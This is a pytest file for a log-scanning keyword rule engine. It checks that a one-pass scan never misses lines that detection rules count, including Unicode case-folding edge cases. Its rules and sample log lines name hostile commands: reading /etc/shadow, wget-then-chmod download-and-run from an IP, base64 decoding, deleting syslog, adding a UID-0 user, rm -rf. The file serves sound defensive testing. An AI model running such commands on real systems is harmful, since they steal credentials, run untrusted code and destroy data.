"""One pass over the lines for all keyword rules: it must not lose a line a rule counts."""

import random
import re
from types import SimpleNamespace

import pytest

from app.rules.evaluators import create_evaluator
from app.rules.scan import KeywordScan
from app.rules.schema import RULE


def rule(number: int, **fields):
    base = {"id": f"KW-{number}", "name": "Test", "type": "keyword", "severity": "low"}
    return RULE.validate_python(base | fields)


RULES = [
    rule(1, keywords=["/etc/shadow", "authorized_keys"]),
    rule(2, keywords=["wget *; chmod +x", "*| base64 -d *"]),
    rule(3, keywords=["pkexec"], require=["XAUTHORITY"]),
    rule(4, keywords=["rm /var/log/syslog"], exclude=["/syslog."]),
    rule(5, keywords=["çözüm", "İstanbul"]),
    rule(6, keywords=["kiss", "disk"]),  # letters with more than two cases: K, ſ, ı, İ
    rule(7, keywords=[], regex=r"UID=0\b"),
    rule(8, keywords=["new user"], regex=r"^session opened"),
    rule(9, keywords=[r"rm -rf \*", r"C:\\*\temp"]),
]

LINES = [
    ("sudo", "bob : COMMAND=/usr/bin/cat /etc/shadow"),
    ("sudo", "BOB : COMMAND=/USR/BIN/CAT /ETC/SHADOW"),
    ("sshd", "Accepted publickey for alice; AUTHORIZED_KEYS read"),
    ("sudo", "COMMAND=/bin/sh -c wget http://198.51.100.9/a -O /tmp/a; chmod +x /tmp/a"),
    ("sudo", "COMMAND=/bin/sh -c chmod +x /tmp/a; wget http://198.51.100.9/a"),
    ("sudo", "COMMAND=/bin/sh -c echo aGk= | base64 -d > /tmp/x"),
    ("pkexec", "bob: The value for environment variable XAUTHORITY contains suspicious content"),
    ("pkexec", "bob: Executing command"),
    ("sudo", "pkexec was mentioned, and so was xauthority"),
    ("sudo", "COMMAND=/bin/rm /var/log/syslog"),
    ("sudo", "COMMAND=/bin/rm /var/log/syslog.7.gz"),
    ("cron", "geçici ÇÖZÜM uygulandı"),
    ("cron", "istanbul ofisi"),
    ("cron", "ISTANBUL OFİSİ"),
    ("app", "KISS principle"),  # ASCII
    ("app", "\u212aiss of death"),  # Kelvin sign for K
    ("app", "ki\u017f\u017f me"),  # long s
    ("app", "D\u0130SK FULL"),  # dotted capital I
    ("app", "d\u0131sk full"),  # dotless i
    ("useradd", "new user: name=mallory, UID=0, GID=0, home=/root"),
    ("useradd", "NEW USER: name=carol, UID=1004, GID=1004"),
    ("sshd", "session opened for user alice"),
    ("sshd", "pam: session opened for user alice"),
    ("sudo", "COMMAND=/bin/rm -rf *"),
    ("sudo", "COMMAND=/bin/rm -rf /tmp/build"),
    ("app", r"opened C:\Users\bob\temp"),
    (None, "a line that no program put its name to: /etc/shadow"),
    (None, "nothing of interest here"),
    ("kernel", "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.150 DST=192.0.2.5 PROTO=TCP DPT=23"),
]


def counted(rules, rows) -> set[tuple[int, int]]:
    """(event id, number of the rule) for every line a rule's evaluator counts."""
    found = set()
    for number, each in enumerate(rules):
        evaluator = create_evaluator(each)
        for event_id, service, message in rows:
            event = SimpleNamespace(service=service, message=message)
            if evaluator.spans(event, "key") is not None:
                found.add((event_id, number))
    return found


def rows_of(lines) -> list[tuple[int, str | None, str]]:
    return [(index, service, message) for index, (service, message) in enumerate(lines, 1)]


@pytest.mark.parametrize("sample", ["none", "all", "start", "end", "other"])
def test_no_line_that_a_rule_counts_is_missed(sample):
    """The lines the pass saw beforehand decide what it tests first, not what it finds."""
    rows = rows_of(LINES)
    known = {
        "none": [],
        "all": rows,
        "start": rows[:3],
        "end": rows[-3:],
        "other": [(1, "sshd", "Failed password for root")] * 50,
    }
    candidates = set(KeywordScan(RULES, known[sample]).candidates(rows))

    expected = counted(RULES, rows)
    assert expected <= candidates
    # Every rule is in play, or the comparison says little.
    assert {number for _, number in expected} == set(range(len(RULES)))
    # And the pass is worth making: it leaves nearly all pairs of line and rule out.
    assert len(candidates) <= len(expected) + 6


def test_letters_with_more_than_two_cases_are_matched_as_the_evaluator_matches_them():
    """Lowering both sides is not what ignoring case means outside ASCII."""
    kiss = re.compile("kiss", re.IGNORECASE)
    assert kiss.search("\u212aiss") and kiss.search("ki\u017f\u017f")  # what the evaluator does
    assert "kiss" not in "ki\u017f\u017f".lower()  # and what lowering would make of it

    rows = rows_of([("app", "ki\u017f\u017f me"), ("app", "\u212aiss"), ("app", "d\u0131sk")])
    found = set(KeywordScan([rule(6, keywords=["kiss", "disk"])]).candidates(rows))
    assert found == counted([rule(6, keywords=["kiss", "disk"])], rows) == {(1, 0), (2, 0), (3, 0)}


def test_random_lines():
    """Lines put together from pieces of keywords, of other text, and of each other."""
    rng = random.Random(7)
    pieces = [
        "/etc/shadow", "/ETC/Shadow", "authorized_keys", "wget ", "; chmod +x", "| base64 -d ",
        "pkexec", "XAUTHORITY", "rm /var/log/syslog", "/syslog.", "çözüm", "ÇÖZÜM", "İstanbul",
        "kiss", "ki\u017f\u017f", "disk", "d\u0131sk", "UID=0", "UID=01", "new user", "NEW USER",
        "session opened", "rm -rf *", "rm -rf ", "C:\\", "\\temp", " ", "x", ": ", "=", "9",
    ]  # fmt: skip
    programs = [None, "sudo", "pkexec", "sshd", "Kiss", "çözüm"]
    lines = [
        (rng.choice(programs), "".join(rng.choice(pieces) for _ in range(rng.randint(1, 6))))
        for _ in range(3000)
    ]
    rows = rows_of(lines)
    candidates = set(KeywordScan(RULES, rows[:200]).candidates(rows))
    expected = counted(RULES, rows)
    assert len(expected) > 1000
    assert expected <= candidates


def test_each_candidate_is_reported_once_per_rule():
    rows = rows_of([("sudo", "cat /etc/shadow /etc/shadow authorized_keys /etc/shadow")])
    assert list(KeywordScan(RULES).candidates(rows)) == [(1, 0)]


def test_no_rules_no_candidates():
    assert list(KeywordScan([]).candidates(rows_of(LINES))) == []
